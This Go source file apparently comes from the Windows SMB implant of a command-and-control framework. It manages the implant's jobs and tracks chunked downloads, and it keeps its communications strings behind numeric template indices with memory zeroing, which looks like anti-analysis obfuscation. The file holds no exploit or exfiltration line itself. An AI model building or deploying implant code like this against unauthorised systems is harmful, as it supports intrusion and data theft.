// server/docker/payloads/SMB_Windows/job_manager.go

//go:build windows
// +build windows

package main

import (
	"fmt"
	"time"
)

// CommsTemplate stores communications-related template strings
type CommsTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Global comms template storage for job manager (uses SecureTemplate for memory zeroing)
var globalCommsTpl *SecureTemplate

// Job manager template index constant
const idxJmTypeDownload = 785 // download - matches server's IdxCqCmdDownload

// setCommsTemplate stores the comms template (converts to SecureTemplate)
func setCommsTemplate(tpl *CommsTemplate) {
	// Zero old template before replacing
	if globalCommsTpl != nil {
		globalCommsTpl.Zero()
	}
	globalCommsTpl = NewSecureTemplateFromSlices(tpl.Version, tpl.Type, tpl.Templates, tpl.Params)
}

// jmTpl safely retrieves a template string by index for job manager
func jmTpl(idx int) string {
	return globalCommsTpl.Get(idx)
}

// commsTpl alias for compatibility with shared code (command_queue.go, transforms.go)
func commsTpl(idx int) string {
	return globalCommsTpl.Get(idx)
}

// CreateJob creates a new job with specified type and filename
func (cq *CommandQueue) CreateJob(jobType string, filename string) string {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	jobID := fmt.Sprintf("%s_%d", jobType, time.Now().UnixNano())
	cq.activeJobs[jobID] = JobInfo{
		ID:        jobID,
		StartTime: time.Now(),
		Filename:  filename,
		Active:    true,
		Type:      jobType,
	}

	return jobID
}

// CompleteJob marks a job as completed
func (cq *CommandQueue) CompleteJob(jobID string) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	if job, exists := cq.activeJobs[jobID]; exists {
		job.Active = false
		cq.activeJobs[jobID] = job
	}
}

// KillJob terminates an active job
func (cq *CommandQueue) KillJob(jobID string) error {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	job, exists := cq.activeJobs[jobID]
	if !exists {
		return fmt.Errorf(ErrCtx(E26, jobID))
	}

	// Remove from active downloads if it's a download job
	if job.Type == jmTpl(idxJmTypeDownload) {
		delete(cq.activeDownloads, job.Filename)
	}

	delete(cq.activeJobs, jobID)
	return nil
}

// AddOrUpdateDownload adds or updates a download operation
func (cq *CommandQueue) AddOrUpdateDownload(filename string, filepath string, totalChunks int) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	if downloadInfo, exists := cq.activeDownloads[filename]; exists {
		downloadInfo.LastUpdate = time.Now()
		if !downloadInfo.InProgress {
			downloadInfo.InProgress = true
		}
	} else {
		cq.activeDownloads[filename] = &DownloadInfo{
			FilePath:    filepath,
			TotalChunks: totalChunks,
			NextChunk:   1,
			LastUpdate:  time.Now(),
			InProgress:  true,
		}
	}
}

// UpdateDownloadProgress updates the progress of a download operation
func (cq *CommandQueue) UpdateDownloadProgress(filename string, chunkNum int) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	if downloadInfo, exists := cq.activeDownloads[filename]; exists {
		downloadInfo.NextChunk = chunkNum + 1
		downloadInfo.LastUpdate = time.Now()
		if downloadInfo.NextChunk > downloadInfo.TotalChunks {
			downloadInfo.InProgress = false
		}
	}
}
